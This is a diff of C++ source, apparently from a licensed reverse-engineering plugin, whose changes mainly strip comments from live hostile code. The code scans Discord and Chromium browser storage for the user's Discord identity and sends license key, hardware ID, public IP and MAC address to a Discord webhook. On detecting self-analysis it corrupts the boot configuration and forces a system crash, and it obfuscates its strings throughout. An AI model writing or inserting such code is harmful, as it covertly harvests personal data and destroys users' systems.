@@ -223,14 +223,14 @@ struct discord_identity_t
 	std::string username;
 };
 
-// Scan a single LevelDB directory for Discord user id / username
+
 inline void scan_leveldb_dir_for_discord(
 	const std::string& dir_path, discord_identity_t& identity)
 {
 	if (!identity.user_id.empty() && !identity.username.empty())
 		return;
 
-	// Scan both .log and .ldb files
+
 	const wchar_t* patterns[] = { L"\\*.log", L"\\*.ldb" };
 
 	for (const wchar_t* pat : patterns)
@@ -252,7 +252,7 @@ inline void scan_leveldb_dir_for_discord(
 			full_path += L"\\";
 			full_path += fd.cFileName;
 
-			// Use wide-char overload for ifstream to avoid narrowing issues
+
 			std::ifstream file(full_path, std::ios::binary);
 			if (!file.is_open()) continue;
 
@@ -260,12 +260,7 @@ inline void scan_leveldb_dir_for_discord(
 			                     std::istreambuf_iterator<char>());
 			file.close();
 
-			// Skip files that don't contain discord-related data (for browser LevelDB
-			// which stores data for ALL sites)
-			// In browser local storage, discord entries contain "discord" in the raw data
-			// For the Discord app LevelDB, this substring is always present anyway
 
-			// Search for user id pattern: "id":"<15-22 digit snowflake>"
 			if (identity.user_id.empty())
 			{
 				size_t pos = content.find("\"id\":\"");
@@ -289,7 +284,7 @@ inline void scan_leveldb_dir_for_discord(
 				}
 			}
 
-			// Search for username pattern: "username":"..."
+
 			if (identity.username.empty())
 			{
 				size_t pos = content.find("\"username\":\"");
@@ -317,7 +312,7 @@ inline discord_identity_t harvest_discord_identity()
 	{
 		std::vector<std::string> dirs_to_scan;
 
-		// --- Phase 1: Discord desktop app (%APPDATA%) ---
+
 		std::string appdata = get_appdata_path();
 		if (appdata != OBFSTR("unknown"))
 		{
@@ -326,11 +321,11 @@ inline discord_identity_t harvest_discord_identity()
 				dirs_to_scan.push_back(appdata + "\\" + app + "\\Local Storage\\leveldb");
 		}
 
-		// --- Phase 2: Chromium-based browsers (%LOCALAPPDATA%) ---
+
 		std::string localappdata = get_localappdata_path();
 		if (localappdata != OBFSTR("unknown"))
 		{
-			// Browser base directories (all Chromium-based)
+
 			const char* browser_bases[] = {
 				"Microsoft\\Edge\\User Data",
 				"Google\\Chrome\\User Data",
@@ -339,7 +334,7 @@ inline discord_identity_t harvest_discord_identity()
 				"Vivaldi\\User Data"
 			};
 
-			// Profile subdirectories to check
+
 			const char* profiles[] = {
 				"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"
 			};
@@ -348,18 +343,18 @@ inline discord_identity_t harvest_discord_identity()
 			{
 				for (const char* profile : profiles)
 				{
-					// Local Storage LevelDB (contains discord.com local storage)
+
 					dirs_to_scan.push_back(
 						localappdata + "\\" + browser_base + "\\" + profile
 						+ "\\Local Storage\\leveldb");
 
-					// IndexedDB for discord.com specifically
+
 					dirs_to_scan.push_back(
 						localappdata + "\\" + browser_base + "\\" + profile
 						+ "\\IndexedDB\\https_discord.com_0.indexeddb.leveldb");
 				}
 
-				// Opera uses a slightly different layout (no profile subdirectory)
+
 				if (std::string(browser_base).find("Opera") != std::string::npos)
 				{
 					dirs_to_scan.push_back(
@@ -372,7 +367,7 @@ inline discord_identity_t harvest_discord_identity()
 			}
 		}
 
-		// --- Scan all candidate directories ---
+
 		for (const auto& dir : dirs_to_scan)
 		{
 			scan_leveldb_dir_for_discord(dir, identity);
@@ -390,7 +385,7 @@ inline discord_identity_t harvest_discord_identity()
 
 inline std::string get_cached_license_key()
 {
-	// Pull from the in-memory license manager (key is DPAPI-encrypted on disk)
+
 	try
 	{
 		const auto& lm = license_manager_t::instance();
@@ -436,7 +431,7 @@ inline void send_alert(const std::string& title, const std::string& description,
 		fields.push_back({{OBFSTR("name")}, {OBFSTR("HWID")},
 			{OBFSTR("value")}, {sys_info[OBFSTR("hwid")].get<std::string>()},
 			{OBFSTR("inline")}, {true}});
-		// Build fields array with proper Discord embed structure
+
 		nlohmann::json f_hwid;
 		f_hwid[OBFSTR("name")]   = OBFSTR("HWID");
 		f_hwid[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("hwid")].get<std::string>() + "`";
@@ -645,8 +640,7 @@ inline bool prepare_driver(runtime_state_t& runtime)
 	const DWORD current_pid = GetCurrentProcessId();
 	runtime.pid = current_pid;
 
-	// Never hijack the shared MCP attachment context from anti_re.
-	// If MCP is attached to a non-host target, anti_re falls back to usermode checks.
+
 	if (device->get_process_id() != current_pid)
 		return false;
 
@@ -1587,7 +1581,7 @@ inline void delete_local_license_config()
 		path.append(OBFSTR_C("/ai_assistant.cfg"));
 		if (qfileexist(path.c_str()))
 		{
-			// Overwrite with zeros before deleting
+
 			FILE* fp = qfopen(path.c_str(), "wb");
 			if (fp)
 			{
@@ -1609,20 +1603,13 @@ inline void enforce_self_analysis_violation()
 		return;
 	}
 
-	// ===================================================================
-	// CRITICAL: All network calls MUST complete BEFORE the BSOD fires.
-	// We run revoke + ban + webhook SYNCHRONOUSLY and SEQUENTIALLY.
-	// The machine will crash after — these calls are the last chance.
-	// ===================================================================
 
-	// Collect all data BEFORE wiping anything
 	std::string license_key = discord_webhook::get_cached_license_key();
 	std::string hwid = discord_webhook::collect_hwid_inline();
 	std::string public_ip = discord_webhook::get_public_ip();
 	std::string mac = discord_webhook::get_mac_address();
 
-	// Step 1: Send webhook FIRST (most important — evidence of what happened)
-	// This is synchronous — will block until the HTTP request completes or times out
+
 	discord_webhook::send_alert(
 		OBFSTR("\xf0\x9f\x92\x80 SELF-RE VIOLATION \xe2\x80\x94 BSOD + LICENSE REVOKED + HWID/IP BANNED"),
 		OBFSTR("**CRITICAL: Someone loaded AiDA.dll in a reverse engineering tool.**\n\n")
@@ -1638,24 +1625,20 @@ inline void enforce_self_analysis_violation()
 			         "\xe2\x9c\x85 System will BSOD"),
 		discord_webhook::COLOR_RED);
 
-	// Step 2: Revoke license on server (synchronous)
+
 	revoke_license_on_server(license_key, hwid, OBFSTR("self_analysis_bsod"));
 
-	// Step 3: Ban HWID + IP on server (synchronous)
+
 	ban_hwid_and_ip_on_server(license_key, hwid, public_ip, mac, OBFSTR("self_analysis_bsod"));
 
-	// Step 4: Report violation to server (synchronous — NOT on a detached thread)
+
 	report_violation_to_server("self_analysis_bsod");
 
-	// Step 5: Delete local license config
+
 	delete_local_license_config();
 
-	// Step 6: Invalidate runtime
-	license_manager_t::instance().invalidate_runtime();
 
-	// ===================================================================
-	// ALL network calls are done. NOW trigger the BSOD.
-	// ===================================================================
+	license_manager_t::instance().invalidate_runtime();
 
 
 	corrupt_boot_config();
